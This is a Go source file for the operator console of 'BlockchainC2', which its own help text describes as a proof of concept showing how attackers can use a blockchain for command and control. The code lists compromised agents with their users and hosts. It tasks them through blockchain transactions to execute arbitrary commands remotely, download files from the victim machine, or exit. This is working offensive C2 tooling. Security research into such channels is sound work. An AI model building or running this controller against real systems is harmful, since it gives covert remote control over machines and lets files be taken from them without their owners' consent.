package main

import (
	"blockchainc2/internal/pkg/BlockchainC2"
	"fmt"
	"regexp"
	"time"

	"github.com/gdamore/tcell"
	"github.com/rivo/tview"
)

// UIChannelMsg contains info sent from the UI to the server UI handler when requesting to
// execute a command for an agent
type UIChannelMsg struct {
	Agent *BlockchainC2.Agent
	Cmd   string
	Data  string
}

// startConsole uses tview to craft a UI to handle agent interaction via the console
// commIn - channel used to provide commands to the UI such as a request to redraw
// commOut - channel used to send requests from the UI to an agent
func startConsole(bc *BlockchainC2.BlockchainServer, commIn chan string, commOut chan UIChannelMsg) {

	running := true

	app := tview.NewApplication()
	table := tview.NewTable()
	input := tview.NewInputField()
	history := tview.NewTextView().SetChangedFunc(func() {
		app.Draw()
	})
	history.
		SetScrollable(true).
		SetDoneFunc(func(key tcell.Key) {
			if key == tcell.KeyTab {
				app.SetFocus(input)
			}
		}).
		SetBorder(true)

	input.
		SetLabel("Command: ").
		SetFieldWidth(0).
		SetDoneFunc(func(key tcell.Key) {
			// Get currently selected agent
			if key == tcell.KeyEnter {
				row, _ := table.GetSelection()
				agentSelected := table.GetCell(row, 0).Text
				if agent := bc.GetAgentByID(agentSelected); agent != nil {
					commOut <- UIChannelMsg{Agent: agent, Cmd: "SendCmd", Data: input.GetText()}
				}
				input.SetText("")
				app.SetFocus(table)
			} else if key == tcell.KeyTab {
				app.SetFocus(table)
			}
		}).
		SetBorder(true)

	table.SetCell(0, 0, tview.NewTableCell("AgentID").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
	table.SetCell(0, 1, tview.NewTableCell("Username").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
	table.SetCell(0, 2, tview.NewTableCell("Hostname").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
	table.SetCell(0, 3, tview.NewTableCell("Last Seen").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
	table.SetSelectable(true, false)
	table.SetBorder(true)

	table.Select(0, 0).SetFixed(0, 0).SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEscape {
			app.Stop()
		} else if key == tcell.KeyTab {
			app.SetFocus(history)
		} else if key == tcell.KeyEnter {
			app.SetFocus(input)
			row, _ := table.GetSelection()
			agentSelected := table.GetCell(row, 0).Text
			if agent := bc.GetAgentByID(agentSelected); agent != nil {
				history.SetText(agent.UIHistory)
			}
		}
	}).SetSelectionChangedFunc(func(row, column int) {
		agentSelected := table.GetCell(row, 0).Text
		if agent := bc.GetAgentByID(agentSelected); agent != nil {
			history.SetText(agent.UIHistory)
		}
	}) /*.SetSelectedFunc(func(row int, column int) {
		table.GetCell(row, column).SetTextColor(tcell.ColorRed)

	})*/

	flex := tview.NewFlex().
		AddItem(table, 0, 1, true).
		AddItem(history, 0, 3, false).
		AddItem(input, 3, 1, false).
		SetDirection(tview.FlexRow)

	app.SetRoot(flex, true).SetFocus(flex)

	go app.Run()

	for running {

		msg := <-commIn

		switch msg {
		case "Refresh":
			table.Clear()
			table.SetCell(0, 0, tview.NewTableCell("AgentID").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
			table.SetCell(0, 1, tview.NewTableCell("Username").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
			table.SetCell(0, 2, tview.NewTableCell("Hostname").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))
			table.SetCell(0, 3, tview.NewTableCell("Last Seen").SetAlign(tview.AlignCenter).SetExpansion(1).SetMaxWidth(0))

			i := 0
			for id, agent := range bc.GetAllAgents() {
				table.SetCell(i+1, 0, tview.NewTableCell(id).SetAlign(tview.AlignCenter))
				table.SetCell(i+1, 1, tview.NewTableCell(agent.CurrentUser).SetAlign(tview.AlignCenter))
				table.SetCell(i+1, 2, tview.NewTableCell(agent.Hostname).SetAlign(tview.AlignCenter))
				table.SetCell(i+1, 3, tview.NewTableCell(agent.LastSeen).SetAlign(tview.AlignCenter))
				i++
			}
			i = 0

			row, _ := table.GetSelection()

			agentSelected := table.GetCell(row, 0).Text
			if agent := bc.GetAgentByID(agentSelected); agent != nil {
				history.SetText(agent.UIHistory)
			}

			app.Draw()
		}
	}
}

// parseCommand is responsible for parsing a string provided to the UI via the "Command" input box
func parseCommand(command string) (string, string, error) {

	// Parse our command which is expected to be in the format
	// [COMMAND] [COMMAND_ARGS]
	// eg: execute ls -alF
	re := regexp.MustCompile(`^([a-zA-Z0-9]+)\s*([^\0]*)$`)
	matches := re.FindAllStringSubmatch(command, -1)
	if len(matches) == 0 {
		return "", "", fmt.Errorf("Error parsing command: %s", command)
	}

	return matches[0][1], matches[0][2], nil
}

// appendToLog appends an entry to the agents UI textview
func appendToLog(agent *BlockchainC2.Agent, log string) {
	agent.UIHistory += fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), log)
}

// handleCommand handles a provided command from the UI
func handleCommand(c2 *BlockchainC2.BlockchainServer, agent *BlockchainC2.Agent, command, args string) {

	// Check agents status to see if it is in a position to handle commands
	switch agent.Status {

	case BlockchainC2.Handshake:
		appendToLog(agent, "Agent is not in a ready state... waiting for agent handshake to complete")
		return

	case BlockchainC2.Exited:
		appendToLog(agent, "Agent has exited")
		return

	}

	switch command {

	// Execute a command on the agent
	case "execute":
		appendToLog(agent, fmt.Sprintf("Tasking agent to execute command: %s", args))
		if err := c2.SendToAgent(agent.AgentID, args, BlockchainC2.ServerToAgentExecuteCommand, true); err != nil {
			appendToLog(agent, fmt.Sprintf("Error occurred sending transaction: %v", err))
		}

	// Download file from agent
	case "download":
		appendToLog(agent, fmt.Sprintf("Downloading file from agent: %s", args))
		if err := c2.SendToAgent(agent.AgentID, args, BlockchainC2.ServerToAgentFileDownload, true); err != nil {
			appendToLog(agent, fmt.Sprintf("Error occurred sending transaction: %v", err))
		}

	// Force the agent to quit
	case "exit":
		appendToLog(agent, "Asking agent to exit")
		if err := c2.SendToAgent(agent.AgentID, args, BlockchainC2.ServerToAgentExit, true); err != nil {
			appendToLog(agent, fmt.Sprintf("Error occurred sending transaction: %v", err))
		}
		// Update agent status
		agent.Status = BlockchainC2.Exited

	// Display help
	case "help":
		appendToLog(agent, `
		BlockchainC2 POC by @_xpn_

		This application serves as a small working POC to help explore just how the blockchain can be used by attackers for C2.
		
		execute - Execute a command on the remote agent and return the resulting output
		download - Download a file from the remote agent
		exit - Exit the agent
		help - This help
		`)

	// Unknown command provided
	default:
		appendToLog(agent, fmt.Sprintf("Unrecognised command: %s", command))
		appendToLog(agent, "Use \"help\" to list supported commands")
	}
}

// handleConsole handles incoming and outgoing events from the UI
func handleConsole(c2 *BlockchainC2.BlockchainServer, uiChannelIn chan string, uiChannelOut chan UIChannelMsg) {

	running := true

	for running {
		input := <-uiChannelOut

		switch input.Cmd {

		// Sent by UI when the operator has provided a command to execute
		case "SendCmd":
			command, params, err := parseCommand(input.Data)
			if err != nil {
				appendToLog(input.Agent, fmt.Sprintf("Error parsing command: %s", input.Data))
				return
			}

			// Handle the provided UI command
			handleCommand(c2, input.Agent, command, params)

			// Trigger UI refresh
			uiChannelIn <- "Refresh"

		// Sent by UI when the application is exiting
		case "exit":
			running = false
		}

	}
}
